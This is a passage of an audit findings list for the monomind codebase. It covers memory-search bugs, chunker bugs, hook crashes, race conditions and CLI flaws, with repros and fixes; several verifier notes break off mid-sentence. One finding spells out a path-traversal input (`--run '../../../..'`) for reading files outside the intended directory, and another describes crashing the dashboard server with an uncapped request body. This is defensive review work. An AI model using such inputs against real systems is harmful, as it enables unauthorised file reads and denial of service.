- **Status:** [x] fixed in-session (2026-07-18)

isKnowledgeNs is derived from the request's namespace filter (`namespace?.startsWith('knowledge:')`), not from each result's namespace. When searching without a namespace filter (namespace undefined / 'all'), results that live in knowledge:* namespaces are subjected to the staleDays cutoff (default 7 days, line 393-395) even though the stated intent is that knowledge documents 'remain searchable indefinitely'. The same result set is visible or invisible depending only on whether the caller narrowed the namespace.

**Failure:** A document ingested into namespace 'knowledge:docs' 10 days ago: `memory search --query <doc terms> --namespace knowledge:docs` finds it; `memory search --query <doc terms>` (all namespaces) filters it out — the top semantic hit silently disappears.

**Suggested fix:** Apply the stale filter per result: `results.filter(r => r.namespace?.startsWith('knowledge:') || !r._createdAt || r._createdAt > staleCutoff)` (namespace is already on each mapped result).

**Verifier:** Confirmed end-to-end. CLI `memory search` defaults namespace to 'all' (memory-crud.ts:282), which memory-bridge.ts:326 maps to undefined; semantic search then runs with filters:undefined and sqlite-backend.ts:483-488 omits the namespace WHERE clause, so knowledge:* entries are returned. At memory-bridge.ts:391, isKnowledgeNs is derived from the request filter (undefined → falsy), so lines 393-395 apply the staleDays=7 cutoff to results whose own namespace is knowledge:*; entries carry a numeric createdAt (_createdAt at line 347), so a 10-day-old knowledge:docs chunk is silently dropped. The sa

---

## 19. [MEDIUM] Every search — and every store via the dedup gate — materializes the entire embedding table in memory, with an N+1 re-fetch per hit

- **File:** packages/@monomind/memory/src/sqlite-backend.ts:489  (memory-engine)
- **Status:** [ ] open

SQLiteBackend.search does `.all()` over every entry+embedding in the namespace — or the whole table when no namespace filter is given, which is exactly what the dedup gate does on every single bridgeStoreEntry (memory-bridge.ts:284, no filters). Each row carries full content (up to 1MB per bridge cap) plus the embedding blob, all held in one JS array; then for every row above threshold, rowToEntry (line 500 -> 822) re-queries the embedding it just deleted from the row, an N+1 that also duplicates each vector. SqlJsBackend.search (sqljs-backend.ts:533-537) similarly loads up to 50,000 full entries into the WASM-adjacent JS heap per search. At the stated 10^5-entry scale with large contents this is hundreds of MB to multi-GB per store/search call.

**Failure:** A store with ~100k entries averaging 50KB content: one `memory store` (dedup gate) or `memory search` allocates ~5GB+ transiently (all rows via .all()/query before threshold filtering), causing OOM or multi-second pauses in the MCP server; on sql.js the same load happens inside the 50000-limit query.

**Suggested fix:** Select only id/namespace/embedding for the similarity pass (SELECT e.id, emb.embedding ...), compute top-k, then fetch the k full entries; keep the already-loaded vector instead of re-querying in rowToEntry; cap and paginate the sql.js scan.

**Verifier:** Confirmed end-to-end. SQLiteBackend.search (sqlite-backend.ts:484-489) does an unbounded `.all()` over `SELECT e.*, emb.embedding` joined rows — the whole table when no namespace filter is given — and the dedup gate (memory-bridge.ts:284) calls search with no filters on every embedded non-upsert store, from the CLI, MCP tools, and the long-lived org daemon. Threshold filtering happens in JS after all rows (full content up to 1MB each per BRIDGE_MAX_VALUE_LEN) are materialized. The N+1 is also real: line 499 deletes row._emb, then rowToEntry (line 822) re-queries stmtGetEmbedding for every abov

---

## 20. [MEDIUM] Heading-like lines inside code fences treated as real headings — wrong § section prefix and fence-splitting breaks

- **File:** packages/@monomind/memory/src/knowledge/document-chunker.ts:20  (knowledge-pipeline)
- **Status:** [ ] open

Neither the boundary-snap scan (lines 72-81) nor lastHeadingBefore (lines 23-35) tracks ``` fence state, so any line matching /^#{1,6} / inside a fenced code block (shell comments like `# install dependencies`, Python comments, YAML comments in examples) is treated as a markdown heading. Confirmed by running the shared chunker on a doc with `# Real Section` prose plus a bash fence containing `# install dependencies`: all chunks after the fence are prefixed `§ install dependencies` instead of `§ Real Section`, poisoning both keyword and semantic retrieval for the rest of the section. When such a line lands in the 20% boundary window, the chunker also breaks before it with brokeAtHeading=true, splitting the code block mid-fence AND suppressing the overlap (line 114-116), so fence context is lost across the cut. Identical defect in the inline copy at packages/@monomind/cli/src/knowledge/document-pipeline.ts:29-79 (the copies are otherwise verified in sync).

**Failure:** Ingest a README whose 'Setup' section contains a bash fence with `# install dependencies`. Chunks 2+ get text prefixed '§ install dependencies'; a semantic query about the actual section topic ranks them lower, and retrieved excerpts display a comment line as the section title. If the comment falls in the boundary window, the fence is split with zero overlap.

**Suggested fix:** Track fence state (count of lines matching /^\s*(```|~~~)/ before the position) and skip heading matches inside open fences, in both the boundary scan and lastHeadingBefore; apply the same fix to the inline copy in document-pipeline.ts.

**Verifier:** Confirmed by end-to-end reproduction of the exact chunker logic. document-chunker.ts tracks no code-fence state: HEADING_LINE_RE (/^#{1,6} /, line 20) is tested against raw lines in both lastHeadingBefore (lines 23-35) and the boundary-snap scan (lines 72-81). Repro A: a doc with '# Real Section' prose plus a bash fence containing '# install dependencies' yields chunk 1 prefixed '§ install dependencies' instead of '§ Real Section'. Repro B: when the comment falls in the 20% boundary window, the chunker breaks before it with brokeAtHeading=true, ending chunk 0 mid-fence (last content '```bash\n

---

## 21. [MEDIUM] KNOWLEDGE_REINDEX spawn has no 'error' handler — missing npx crashes the session-start hook process

- **File:** /Volumes/media/projects/monoes/monomind/.claude/helpers/handlers/session-restore-handler.cjs:390  (hooks)
- **Status:** [x] fixed in-session (2026-07-18)

The detached `npx ... doc ingest .` child (lines 390-398) never attaches a .on('error') listener, unlike the otherwise-identical helper-heal spawn at line 201 which explicitly handles 'offline / npx unavailable'. spawn() ENOENT is delivered asynchronously as an 'error' event on the ChildProcess; the surrounding try/catch (line 353/404) cannot catch an async EventEmitter 'error', and hook-handler.cjs installs no process-level uncaughtException handler. An unhandled 'error' event throws and crashes the hook process with a non-zero exit before session-restore finishes.

**Failure:** Claude Code launched from an environment where npx is not on PATH (GUI-launched app, minimal PATH, or node installed via a version manager not sourced for hooks) + a doc-metadata.jsonl exists + a doc changed: spawn emits ENOENT 'error' on next tick -> uncaught exception -> hook process dies mid-handler; everything after this block (god-nodes injection line 407, shared instructions, memory palace, token summary) is skipped and the hook reports failure on every session start.

**Suggested fix:** Add `_kbChild.on('error', function() {});` exactly as the heal spawn does at line 201.

**Verifier:** Confirmed by direct reproduction. The spawn at .claude/helpers/handlers/session-restore-handler.cjs:390-398 (mirrored identically in packages/@monomind/cli/.claude/helpers/) attaches no 'error' listener, unlike its siblings at lines 201 and 474. Node delivers spawn ENOENT via process.nextTick as a ChildProcess 'error' event; a repro script matching the exact structure (try/catch around spawn, then await, main().catch/.finally wrapper) crashes with "Unhandled 'error' event", exit code 1 — the try/catch at lines 353-404, the dispatch catch in hook-handler.cjs:869-871, and main().catch at hook-ha

---

## 22. [MEDIUM] Reindex rate-limit marker only written on dirty — full 2000-stat sync walk runs on every session start when nothing changed

- **File:** /Volumes/media/projects/monoes/monomind/.claude/helpers/handlers/session-restore-handler.cjs:385  (hooks)
- **Status:** [x] fixed in-session (2026-07-18)

reindex-check.json is written only inside `if (_kbDirty)` (lines 382-387). In the steady state — active knowledge base, no docs changed — _kbLastCheck stays stale forever, so the 30-minute gate (line 360) passes on EVERY session start and the synchronous _kbWalk statSync sweep (up to 2000 entries, depth 3) runs every time, blocking session restore. Worse, the _kbScanned>2000 cap is only checked at directory entry (line 366) while the inner for-loop (line 369) only breaks on _kbDirty — a single flat directory with 30k files gets all 30k statSync'd. On a network/exFAT volume (this repo lives on /Volumes/media where statSync is milliseconds each) that is multi-second synchronous blocking, uninterruptible by the 5s safety timer until the sync work yields.

**Failure:** Project with an indexed KB and no recent doc edits, repo on a slow/network volume: every new Claude Code session blocks for the full stat sweep (potentially seconds) during session-restore, forever, because the marker timestamp is never refreshed on a clean scan.

**Suggested fix:** Write the marker after every scan (dirty or clean), and enforce the _kbScanned cap inside the per-entry loop.

**Verifier:** The claim survives end-to-end tracing; I could not refute it. (1) Marker-on-dirty-only: at .claude/helpers/handlers/session-restore-handler.cjs:382-387, fs.writeFileSync of reindex-check.json is only reachable inside `if (_kbDirty)`. A codebase-wide grep shows no other writer of reindex-check.json (only the two identical handler copies), and `monomind doc ingest` never refreshes it. So on a clean scan _kbLastCheck stays stale, the 30-min gate at line 360 passes on every session start, and the full synchronous walk (line 381 `_kbWalk(CWD, 0)`) reruns every time — contradicting the block comment

---

## 23. [MEDIUM] Concurrent ingest spawns corrupt doc-metadata.jsonl (check-then-write marker race + read-filter-rewrite metadata)

- **File:** /Volumes/media/projects/monoes/monomind/.claude/helpers/handlers/session-restore-handler.cjs:359  (hooks)
- **Status:** [ ] open

The 30-min gate is a non-atomic read (line 359) -> compare (360) -> write (385): two session-restore hook processes starting near-simultaneously (two Claude windows on the same project) both read the stale ts, both pass, both write the marker, and both spawn `doc ingest .`. There is also no liveness check, so a still-running ingest from >30 min ago overlaps a new one. Two concurrent ingest processes then race on doc-metadata.jsonl: removeMetadataEntry (document-pipeline.ts:158-163) does a full read-filter-rewrite while the other process appendFileSync's (line 155) — appends landing between the read and the truncating rewrite are silently discarded, losing metadata rows so those files get re-ingested (duplicate work, and stale duplicate rows the `meta.find` at line 217 then resolves nondeterministically).

**Failure:** User opens the same project in two Claude Code windows within a second of each other after editing a doc: both hooks spawn ingest; process A rewrites doc-metadata.jsonl from its in-memory snapshot while B appends completed entries -> B's entries vanish; next session re-ingests those files and the metadata file accumulates conflicting hash rows.

**Suggested fix:** Use an atomic marker (fs.openSync with 'wx' on a lockfile, or mkdir) as the spawn gate, and/or have doc ingest itself take a single-instance lock under .monomind/knowledge/.

**Verifier:** Confirmed on current code. The 30-min gate in session-restore-handler.cjs is a non-atomic read (line 359) / compare (line 360) / write (line 385) with the full dirty-scan walk (lines 362-381, up to 2000 statSync calls) sitting inside the race window, and marker creation uses plain writeFileSync (no wx/O_EXCL, no lock, no pid liveness check) — so two session-restore hook processes from two Claude windows both pass the gate and both spawn detached `doc ingest .` (line 390); a still-running ingest >30 min old also overlaps unconditionally. The two ingest processes then race on doc-metadata.jsonl 

---

## 24. [MEDIUM] POST /api/knowledge/search accumulates request body without any size cap — only uncapped POST route in server.mjs

- **File:** packages/@monomind/cli/src/ui/server.mjs:5923  (server-ui)
- **Status:** [x] fixed in-session (2026-07-18)

The handler does `req.on('data', c => { body += c; })` with no limit. Every other body-reading route in this file enforces a 2 MB cap and destroys the request (e.g. lines 731, 1770, 2058, 3092, 4030, 5410, 6222); this one was added without it. The query is sliced to 2000 chars only AFTER the full body has been buffered and JSON.parse'd, so the cap on `query` provides no protection. Additionally the hook client (.claude/helpers/handlers/route-handler.cjs:365) sends the entire user prompt unsliced as `query`, so very large legitimate prompts also produce large buffered bodies.

**Failure:** Any client holding the token (a hook subprocess, or an attacker who obtained the token e.g. via the orgs.html XSS above) streams a multi-gigabyte POST body to /api/knowledge/search. The server concatenates it into a single JS string: heap balloons until OOM, or the concat exceeds V8's max string length and throws inside the 'data' event listener — an uncaught exception that kills the entire dashboard server process (which also hosts org runs and SSE streams).

**Suggested fix:** Match the established pattern: `req.on('data', c => { body += c; if (body.length > 2097152) { req.destroy(); return; } });`

**Verifier:** Verified on current code: server.mjs:5922-5923 accumulates the POST body with no size cap while all 15 sibling body-reading routes cap at 2MB and destroy the request; the query slice at :5927 runs only after full buffering so it protects nothing. The crash path reproduces: exceeding V8's ~512MB max string length in `body += c` throws RangeError inside the 'data' listener, which is outside the route's try/catch (that wraps only the 'end' callback) and outside the async handler's promise; src/ui has no uncaughtException handler and server.mjs runs standalone hosting SSE streams and org-run inges

---

## 25. [LOW] stopOrg awaits forwarder.settle() with no bound — a stalled dashboard makes org shutdown hang for the entire serialized POST backlog

- **File:** packages/@monomind/cli/src/orgrt/daemon.ts:440  (orgrt-runtime)
- **Status:** [x] fixed in-session (2026-07-18)

forwarder.settle() returns the serialized promise chain in which every bus event issues 1-2 sequential fetches, each with only a per-request 3s AbortSignal timeout (forwarder.ts:74-84). If the control server accepts connections but responds slowly, each event costs up to ~6s and the chain backlogs faster than it drains during a busy run. stopOrg then awaits the full drain with no overall deadline — unlike the agent wait just above it, which is explicitly bounded by stopWaitMs for exactly this reason.

**Failure:** A run emits 200 bus events while the dashboard server is wedged (accepting sockets, never responding). Each POST burns the full 3s abort timeout; the chain is ~600 requests behind by stop time. `monomind org run` Ctrl-C then hangs at exit for tens of minutes inside forwarder.settle() before the process can terminate.

**Suggested fix:** Race forwarder.settle() against a bounded timeout (reuse stopWaitMs or a few seconds) — the forwarder is explicitly best-effort, so an unbounded shutdown wait contradicts its own contract; only the final org-stopped event genuinely matters.

**Verifier:** Confirmed on current code. daemon.ts:440 awaits forwarder.settle() with no overall deadline; settle() (forwarder.ts:87) returns the raw serialized chain where each bus event costs up to 3s (per-request AbortSignal.timeout(3000) only, forwarder.ts:74) and 1-2 POSTs. A wedged dashboard (accepts sockets, never responds) caps drain at ~1 event/3s while policy.ts:55/59 (tool event per tool call) and session.ts:154/158 (chat/usage per turn) produce events faster than that in a busy multi-agent run, so the chain backlogs. Ctrl-C on `monomind org run` (org.ts:112-118) and `org serve` (org.ts:245) then

---

## 26. [LOW] formatEvent's trim() only strips newlines from messages that are NOT truncated — long multi-line messages break the one-line log format

- **File:** packages/@monomind/cli/src/orgrt/reporting.ts:138  (orgrt-runtime)
- **Status:** [ ] open

`trim` is `s.length > n ? s.slice(0, n - 1) + '…' : s.replace(/\n/g, ' ')` — the newline replacement sits on the short branch only, so any message longer than 120 chars is truncated but keeps its embedded newlines.

**Failure:** `monomind org logs` renders a 300-char multi-line agent chat message: the emitted 'one line per event' log gains raw line breaks mid-entry, misaligning the log output (and breaking any consumer that splits the formatted log by lines).

**Suggested fix:** Replace newlines before length-checking: `const flat = s.replace(/\n/g, ' '); return flat.length > n ? flat.slice(0, n - 1) + '…' : flat;`

**Verifier:** Confirmed on current code. trim at packages/@monomind/cli/src/orgrt/reporting.ts:138 is `!s ? '' : s.length > n ? s.slice(0, n-1) + '…' : s.replace(/\n/g, ' ')` — the newline replacement only runs on the short (<=120 char) branch, so messages longer than 120 chars are truncated but keep embedded newlines within the first 119 chars. Traced end-to-end: bus.ts writes msg unsanitized (JSON-escaped newlines survive round-trip), and org-observe.ts:85 prints formatEvent(e) output directly with no further sanitization, so `org logs` emits raw line breaks mid-entry for long multi-line chat/message even

---

## 27. [LOW] logs drain permanently stalls on a corrupt interior line; non-follow mode silently truncates with success

- **File:** packages/@monomind/cli/src/commands/org-observe.ts:94  (org-cli)
- **Status:** [ ] open

drain() treats every JSON.parse failure as a partial tail line (`catch { break }`). That is only correct for the final line mid-append. bus.ts:37-42 swallows appendFile errors (logged only under DEBUG), so a partial write (ENOSPC, crash mid-write) followed by later successful appends produces a permanently corrupt line with valid events after it. drain() breaks at that line on every 500ms tick: --follow prints nothing further forever, and non-follow prints a truncated log and returns success:true. readRunEvents (reporting.ts:101-103) skips bad lines, so `org report` counts events that `org logs` can never display. Additionally, if the file ever shrinks (run dir reused/rewritten), `lines.slice(seenLines)` is empty forever and follow goes silent with no warning.

**Failure:** Disk briefly fills during a run; one bus event is half-written, the run continues after space frees. `monomind org logs growth` shows only events up to the corrupt line and exits 0; `--follow` sits silent while `org report` shows dozens more messages.

**Suggested fix:** Only treat a parse failure as retryable when it is the LAST line of the current read (index === lines.length - 1); for interior lines, warn once, count it as seen, and continue. Detect shrinkage (lines.length < seenLines) and reset seenLines.

**Verifier:** Confirmed end-to-end. bus.ts:37-42 serializes appends and its .catch swallows write failures and resets the chain, so a partial append (ENOSPC mid-write, no trailing newline) followed by later successful appends yields one permanently malformed interior line with valid events after it. drain() at org-observe.ts:93-94 only advances seenLines on successful JSON.parse and does `catch { break }`, so every 500ms tick re-parses the same corrupt line and breaks: --follow goes silent forever, and non-follow (line 97-98) prints the truncated prefix and returns success:true with no warning. reporting.ts

---

## 28. [LOW] --run flag is joined into filesystem paths unvalidated — path traversal the org-name guard explicitly exists to prevent

- **File:** packages/@monomind/cli/src/commands/org-observe.ts:73  (org-cli)
- **Status:** [ ] open

resolveRun returns any non-empty string from --run verbatim; logsAction (line 81) and readRunEvents via reportAction (line 123, reporting.ts:99) then compute join(cwd, ORG_DIR, name, run, 'bus.jsonl'). ORG_NAME_RE (org.ts:13-16) was added precisely to stop traversal through these path components, but the run id component reintroduces it: `--run '../../../../some/where'` escapes .monomind/orgs entirely and reads <anywhere>/bus.jsonl. Read-only, but scripts that interpolate untrusted run ids (e.g. from a dashboard request) inherit the hole, and it is inconsistent with the hardening one path segment earlier.

**Failure:** `monomind org logs growth --run '../../../..'` walks out of the project; any bus.jsonl-named file elsewhere on disk is read and printed. With `org report` the same traversal feeds summarizeRun.

**Suggested fix:** Validate the run id in resolveRun against the format listRunDirs produces (e.g. /^run-[A-Za-z0-9_-]+$/) and fail with 'invalid run id' otherwise.

**Verifier:** Confirmed on current code: resolveRun (org-observe.ts:72-73) returns --run verbatim; logsAction (org-observe.ts:81) and readRunEvents (orgrt/reporting.ts:98-99, via reportAction org-observe.ts:123) join it into join(cwd, ORG_DIR, name, run, 'bus.jsonl'), and path.join normalizes '..', so `org logs <name> --run '../../../..'` escapes .monomind/orgs and reads any bus.jsonl elsewhere on disk. Dispatch (org.ts:437-454) validates only the org name; the '..'-rejecting validatePath in src/utils/input-guards.ts is wired only into MCP tools, not this path. ORG_NAME_RE's own comment (org.ts:13-16) says 

---

## 29. [LOW] org status for a nonexistent org reports 'never run' and exits 0

- **File:** packages/@monomind/cli/src/commands/org.ts:158  (org-cli)
- **Status:** [x] fixed in-session (2026-07-18)

statusAction puts a user-supplied name straight into `targets` without checking that `<name>.json` exists (unlike run/stop, which guard at lines 63 and 140). A typo'd name has no runtime.json, so state defaults to 'never run' and the command prints `typo-name: never run` with success:true.

**Failure:** `monomind org status growht` (typo) prints 'growht: never run' and exits 0 — the user concludes their org exists but was never started, instead of learning the name is wrong; scripts gating on exit code see success.

**Suggested fix:** When a name is given, check existsSync(join(orgDir, `${name}.json`)) and fail with the same 'Org not found' error the other subcommands use.

**Verifier:** Confirmed by direct trace of packages/@monomind/cli/src/commands/org.ts. statusAction (line 150) puts a validated-but-unchecked name into targets at line 158 with no existsSync guard on `<name>.json` — unlike runAction (line 63), stopAction (line 140), deleteAction (line 317), and migrateAction (line 375), which all return 'org not found'. For a typo'd name, `.monomind/orgs/<typo>/runtime.json` does not exist, so the default state `{ status: 'never run' }` (line 163) survives, line 182 prints `<typo>: never run`, and line 184 returns { success: true } → exit 0. The claimed scenario (`monomind 

---

## 30. [LOW] CRLF documents never hit the paragraph-boundary snap — chunks hard-cut mid-word

- **File:** packages/@monomind/memory/src/knowledge/document-chunker.ts:83  (knowledge-pipeline)
- **Status:** [ ] open

The paragraph boundary search is a literal window.lastIndexOf('\n\n'), which never matches CRLF paragraph breaks ('\r\n\r\n'). Confirmed empirically: the same multi-paragraph document chunked with LF snaps every chunk to a paragraph end ('d.\n\n'), while the CRLF version hard-cuts every chunk mid-word ('ord wo'). Heading detection still works for CRLF ('\n#' matches inside '\r\n#', and .trim() strips the trailing '\r' from the § heading text), so this only degrades the paragraph tier — but it silently disables the primary boundary heuristic for every Windows-authored or CRLF-extracted document. Same in the inline copy at document-pipeline.ts:66.

**Failure:** Ingest a .md/.txt saved with CRLF line endings (Windows editors, many DOCX-to-text extractions). Every chunk boundary is a hard character cut mid-sentence/mid-word instead of a paragraph break, and the 400-char overlap re-splits the same broken sentences — measurably worse retrieval granularity than the identical LF file.

**Suggested fix:** Normalize line endings before chunking (text.replace(/\r\n/g, '\n') at ingest — note this changes contentHash for existing CRLF docs, forcing one re-index) or search for /\r?\n\r?\n/ in the window; mirror in the inline copy.

**Verifier:** Confirmed by tracing the code and by empirical repro against the actual chunker. document-chunker.ts:83 searches literally for '\n\n'; a CRLF paragraph break is '\r\n\r\n', which contains no consecutive '\n\n' bytes, so the paragraph-boundary snap never fires for pure-CRLF documents. Neither ingest path normalizes line endings first (knowledge-store.ts:62 readFileSync -> chunkDocument at line 70; document-pipeline.ts:222/243 passes extractText output raw, and cap-documents.ts has no \r handling). Running the shipped chunker on identical LF vs CRLF multi-paragraph text: LF chunks end at paragra

---

## 31. [LOW] searchKnowledge attributes stale/duplicate-content chunks to the wrong or empty filePath

- **File:** packages/@monomind/cli/src/knowledge/document-pipeline.ts:362  (knowledge-pipeline)
- **Status:** [ ] open

Search resolves filePath via a hash->file map built from doc-metadata.jsonl (lines 362-365). Two consequences: (1) after a file's content changes and it is re-ingested under a new hash, the old `doc:<oldHash>:<i>` LanceDB entries (acknowledged as orphaned at line 394-395) still match queries and are returned with filePath '' and stale text — the user sees outdated excerpts with no source attribution and no way to distinguish them from live ones; (2) if two different files with identical content are ingested into the same scope, both produce identical `doc:<hash>:<i>` keys, so the second upserts over the first's chunks, and the Map (last-writer-wins at line 364) attributes all results to whichever file appears later in metadata — removeDocument of that file then leaves the other file's metadata pointing at chunks tagged src: the removed file.

**Failure:** Ingest notes.md, edit it, re-ingest, then search for a phrase that only existed in the old version: the old text is returned with similarity score and filePath '' — presented as a real excerpt from an unnamed file. Or: copy a doc to two paths, ingest both, search — every hit is attributed to only one of the two paths.

**Suggested fix:** Include the docId (scope:path) rather than only the content hash in the chunk key, or filter search results whose hash is absent from current metadata (drop or mark stale) before returning them.

**Verifier:** Confirmed end-to-end. Re-ingest of changed content only removes the metadata line (document-pipeline.ts:238-240); the old doc:<oldHash>:<i> LanceDB entries are never deleted (upsert in bridgeStoreEntry deletes same-key only, memory-bridge.ts:271-278), never expire (no ttl passed, memory-bridge.ts:264), and are explicitly exempted from the stale-entry filter for knowledge: namespaces (memory-bridge.ts:389-396) — so the sweep promised by the comment at document-pipeline.ts:394-395 does not exist. searchKnowledge then resolves the orphan's hash against current metadata only (lines 362-372), retur

---

## 32. [LOW] checkSecondBrainModel model-cache path derivation breaks on Windows and on install paths containing /dist/ — permanent false 'model not downloaded' warning

- **File:** packages/@monomind/cli/src/commands/doctor-project-checks.ts:69  (cleanup-doctor)
- **Status:** [ ] open

pkgDir is computed as `fileURLToPath(entry).replace(/\/dist\/.*$/, '')`. Two failure modes: (1) On Windows, fileURLToPath returns backslash-separated paths (C:\...\node_modules\@huggingface\transformers\dist\transformers.js), so the forward-slash regex never matches and pkgDir stays the full entry FILE path; `join(pkgDir, '.cache', 'Xenova')` then points below a file and can never exist. (2) The regex matches the LEFTMOST '/dist/' in the path, so any install rooted under a directory named 'dist' (e.g. /srv/dist/app/node_modules/@huggingface/transformers/dist/x.mjs) truncates to /srv, again yielding a nonexistent cache path. Either way doctor perpetually reports 'Embedding model not downloaded yet' and tells the user to re-run a ~90MB warmup, even though the model is cached and semantic search works. The CLI clearly intends Windows support (windowsHide flags throughout this file).

**Failure:** Windows user with a fully-cached model runs `monomind doctor`: entry = 'C:\proj\node_modules\@huggingface\transformers\dist\transformers.js', regex doesn't match, existsSync('C:\...\transformers.js\.cache\Xenova') is false -> warn 'Embedding model not downloaded yet' on every doctor run forever.

**Suggested fix:** Strip with a separator-agnostic, last-occurrence match, e.g. `const p = fileURLToPath(entry); const i = p.lastIndexOf(`${sep}dist${sep}`); pkgDir = i >= 0 ? p.slice(0, i) : dirname(p);` — or walk up from the entry file to the nearest directory containing the package's package.json.

**Verifier:** Confirmed at doctor-project-checks.ts:69. The regex /\/dist\/.*$/ operates on the output of fileURLToPath, which uses platform-native separators — reproduced that a Windows-style path (C:\...\transformers\dist\transformers.node.mjs) never matches, leaving pkgDir as the full entry FILE path, so join(pkgDir, '.cache', 'Xenova') points below a file and existsSync is always false → perpetual 'Embedding model not downloaded yet' warn (line 77) with a warmup fix that can never clear it. Also reproduced the leftmost-match mode: '/srv/dist/app/node_modules/@huggingface/transformers/dist/x.mjs' truncat

---

## 33. [LOW] checkSecondBrainModel reports '@huggingface/transformers not installed' on Node 20.0-20.5 where import.meta.resolve does not exist

- **File:** packages/@monomind/cli/src/commands/doctor-project-checks.ts:67  (cleanup-doctor)
- **Status:** [ ] open

`import.meta.resolve` became available without a flag only in Node 20.6.0; on Node 20.0-20.5 (which pass the doctor's own 'Node 20+' floor) the optional-chain yields undefined, the code throws 'resolver unavailable', and the catch reports the package as not installed with a 'reinstall monomind' fix — even when the dependency is present and embeddings work. The catch also conflates 'resolver unavailable' with 'package missing', so any future resolver quirk produces the same misdiagnosis.

**Failure:** User on Node 20.3 with a working knowledge base and installed @huggingface/transformers runs `monomind doctor`: line 67 evaluates import.meta.resolve?.(...) -> undefined -> throw -> warn '@huggingface/transformers not installed — semantic search degraded to keyword matching', prompting a pointless reinstall.

**Suggested fix:** Fall back to createRequire(import.meta.url).resolve('@huggingface/transformers/package.json')-style resolution when import.meta.resolve is absent (subpath package.json is blocked by the exports map, so resolve the exported entry via require.resolve instead), or at minimum emit a distinct 'could not verify (Node < 20.6)' message for the resolver-unavailable branch.

**Verifier:** Confirmed, not refuted. doctor-project-checks.ts:67 runs as native ESM (package "type":"module"; dist preserves import.meta.resolve?.() verbatim), and import.meta.resolve is undefined without a flag before Node 20.6.0 (stable unflagged in 20.6.0/18.19.0). Engines is ">=20.0.0" and the doctor's own Node check (doctor-env-checks.ts:39-48) passes any 20.x and only warns on 18.x, so Node 20.0-20.5 (and 18.0-18.18) users are in-support. On those versions the optional chain yields undefined, line 68 throws 'resolver unavailable', and the catch at line 70-71 misreports '@huggingface/transformers not 

---

